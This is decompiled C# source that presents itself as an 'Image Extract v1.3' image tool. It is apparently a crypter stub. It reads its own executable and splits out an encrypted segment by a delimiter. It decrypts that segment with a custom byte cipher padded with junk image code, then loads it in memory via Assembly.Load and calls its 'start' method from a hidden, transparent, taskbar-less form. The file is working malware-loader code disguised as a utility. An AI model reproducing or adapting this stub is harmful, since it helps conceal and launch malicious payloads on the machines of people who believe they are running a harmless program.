using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Image_Extract_v1._3;

[DesignerGenerated]
public class Jack : Form
{
	private IContainer components;

	[AccessedThroughProperty("cbox")]
	private CheckBox _cbox;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("MaskedTextBox1")]
	private MaskedTextBox _MaskedTextBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("CheckedListBox1")]
	private CheckedListBox _CheckedListBox1;

	public string delim;

	private string exestr;

	private string spt1;

	private string spt3;

	private byte[] assbl;

	internal virtual CheckBox cbox
	{
		get
		{
			return _cbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_cbox = value;
		}
	}

	internal virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button3 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual MaskedTextBox MaskedTextBox1
	{
		get
		{
			return _MaskedTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MaskedTextBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual CheckedListBox CheckedListBox1
	{
		get
		{
			return _CheckedListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = CheckedListBox1_SizeChanged;
			if (_CheckedListBox1 != null)
			{
				((Control)_CheckedListBox1).remove_SizeChanged(eventHandler);
			}
			_CheckedListBox1 = value;
			if (_CheckedListBox1 != null)
			{
				((Control)_CheckedListBox1).add_SizeChanged(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		components = new Container();
		cbox = new CheckBox();
		Button3 = new Button();
		RadioButton1 = new RadioButton();
		MaskedTextBox1 = new MaskedTextBox();
		ProgressBar1 = new ProgressBar();
		PictureBox1 = new PictureBox();
		Timer1 = new Timer(components);
		Button1 = new Button();
		Button2 = new Button();
		ImageList1 = new ImageList(components);
		CheckedListBox1 = new CheckedListBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((ButtonBase)cbox).set_AutoSize(true);
		cbox.set_Checked(true);
		cbox.set_CheckState((CheckState)1);
		CheckBox obj = cbox;
		Point location = new Point(329, 153);
		((Control)obj).set_Location(location);
		((Control)cbox).set_Name("cbox");
		CheckBox obj2 = cbox;
		Size size = new Size(81, 17);
		((Control)obj2).set_Size(size);
		((Control)cbox).set_TabIndex(4);
		((ButtonBase)cbox).set_Text("CheckBox1");
		((ButtonBase)cbox).set_UseVisualStyleBackColor(true);
		Button button = Button3;
		location = new Point(466, 153);
		((Control)button).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button2 = Button3;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button3).set_TabIndex(5);
		((ButtonBase)Button3).set_Text("Button3");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(309, 89);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(7);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		MaskedTextBox maskedTextBox = MaskedTextBox1;
		location = new Point(441, 100);
		((Control)maskedTextBox).set_Location(location);
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		MaskedTextBox maskedTextBox2 = MaskedTextBox1;
		size = new Size(100, 20);
		((Control)maskedTextBox2).set_Size(size);
		((Control)MaskedTextBox1).set_TabIndex(8);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(397, 230);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(9);
		PictureBox pictureBox = PictureBox1;
		location = new Point(320, 222);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(100, 50);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(10);
		PictureBox1.set_TabStop(false);
		Timer1.set_Enabled(true);
		Button button3 = Button1;
		location = new Point(519, 208);
		((Control)button3).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button4 = Button1;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button1).set_TabIndex(11);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button5 = Button2;
		location = new Point(0, 0);
		((Control)button5).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button6 = Button2;
		size = new Size(75, 23);
		((Control)button6).set_Size(size);
		((Control)Button2).set_TabIndex(12);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		ImageList1.set_ColorDepth((ColorDepth)8);
		ImageList imageList = ImageList1;
		size = new Size(16, 16);
		imageList.set_ImageSize(size);
		ImageList1.set_TransparentColor(Color.Transparent);
		((ListControl)CheckedListBox1).set_FormattingEnabled(true);
		CheckedListBox checkedListBox = CheckedListBox1;
		location = new Point(83, 106);
		((Control)checkedListBox).set_Location(location);
		((Control)CheckedListBox1).set_Name("CheckedListBox1");
		CheckedListBox checkedListBox2 = CheckedListBox1;
		size = new Size(130, 64);
		((Control)checkedListBox2).set_Size(size);
		((Control)CheckedListBox1).set_TabIndex(13);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Gainsboro);
		size = new Size(301, 259);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)CheckedListBox1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)MaskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)cbox);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Jack");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Image Extract v1.3");
		((Form)this).set_TransparencyKey(Color.Gainsboro);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public byte[] dcrp(string inputstring, string pass)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Expected O, but got Unknown
		byte[] bytes = Encoding.Default.GetBytes(inputstring);
		int num = 0;
		int i = 0;
		checked
		{
			for (int length = pass.Length; i < length; i++)
			{
				char c = pass[i];
				num += Strings.Asc(c);
			}
			int num2 = bytes.Length - 2;
			PictureBox val = default(PictureBox);
			string text = default(string);
			for (int j = 0; j <= num2; j += 2)
			{
				int num3 = bytes[j];
				int num4 = bytes[j + 1];
				int k = 2 * num4 - num - num3;
				int l = num - num3 + num4;
				PictureBoxSizeMode sizeMode = (PictureBoxSizeMode)3;
				try
				{
					val.set_Image((Image)null);
					val.set_SizeMode(sizeMode);
					if (File.Exists(text))
					{
						Bitmap val2 = (Bitmap)Image.FromFile(text);
						double num5 = (double)((Image)val2).get_Width() / (double)((Control)val).get_Width();
						double num6 = (double)((Image)val2).get_Height() / (double)((Control)val).get_Height();
						Bitmap val3;
						if (unchecked(num5 > 1.0 || num6 > 1.0))
						{
							double num7 = ((!(num5 > num6)) ? num6 : num5);
							val3 = new Bitmap((int)Math.Round((double)((Image)val2).get_Width() / num7), (int)Math.Round((double)((Image)val2).get_Height() / num7));
							val3.SetResolution(((Image)val2).get_HorizontalResolution(), ((Image)val2).get_VerticalResolution());
							Graphics val4 = Graphics.FromImage((Image)(object)val3);
							val4.set_InterpolationMode((InterpolationMode)7);
							Graphics obj = val4;
							Rectangle rectangle = new Rectangle(0, 0, (int)Math.Round((double)((Image)val2).get_Width() / num7), (int)Math.Round((double)((Image)val2).get_Height() / num7));
							obj.DrawImage((Image)(object)val2, rectangle, 0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height(), (GraphicsUnit)2);
							val4.Dispose();
						}
						else
						{
							val3 = new Bitmap(((Image)val2).get_Width(), ((Image)val2).get_Height());
							val3.SetResolution(((Image)val2).get_HorizontalResolution(), ((Image)val2).get_VerticalResolution());
							Graphics val4 = Graphics.FromImage((Image)(object)val3);
							val4.set_InterpolationMode((InterpolationMode)7);
							Graphics obj2 = val4;
							Rectangle rectangle = new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height());
							obj2.DrawImage((Image)(object)val2, rectangle, 0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height(), (GraphicsUnit)2);
							val4.Dispose();
						}
						((Image)val2).Dispose();
						val.set_Image((Image)(object)val3);
					}
					else
					{
						val.set_Image((Image)null);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				for (; l < 0; l += 256)
				{
				}
				for (; k < 0; k += 256)
				{
				}
				bytes[j] = (byte)unchecked(l % 256);
				bytes[j + 1] = (byte)unchecked(k % 256);
			}
			return bytes;
		}
	}

	public byte[] expat()
	{
		return File.ReadAllBytes(Application.get_ExecutablePath());
	}

	public Jack()
	{
		((Control)this).add_SizeChanged((EventHandler)Jack_SizeChanged);
		((Form)this).add_Load((EventHandler)Jack_Load);
		delim = "//fhsgfjsdzerbfd//";
		exestr = Encoding.Default.GetString(expat());
		spt1 = Strings.Split(exestr, delim, -1, (CompareMethod)0)[1];
		spt3 = Strings.Split(exestr, delim, -1, (CompareMethod)0)[3];
		assbl = dcrp(spt1, spt3);
		InitializeComponent();
		CheckedListBox checkedListBox = CheckedListBox1;
		Size size = new Size(45, 55);
		((Control)checkedListBox).set_Size(size);
	}

	private void Jack_Load(object sender, EventArgs e)
	{
	}

	private void CheckedListBox1_SizeChanged(object sender, EventArgs e)
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Jack_SizeChanged(object sender, EventArgs e)
	{
		NewLateBinding.LateCall(Activator.CreateInstance(Assembly.Load(assbl).GetType("Class1.Class1")), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		ProjectData.EndApp();
	}
}
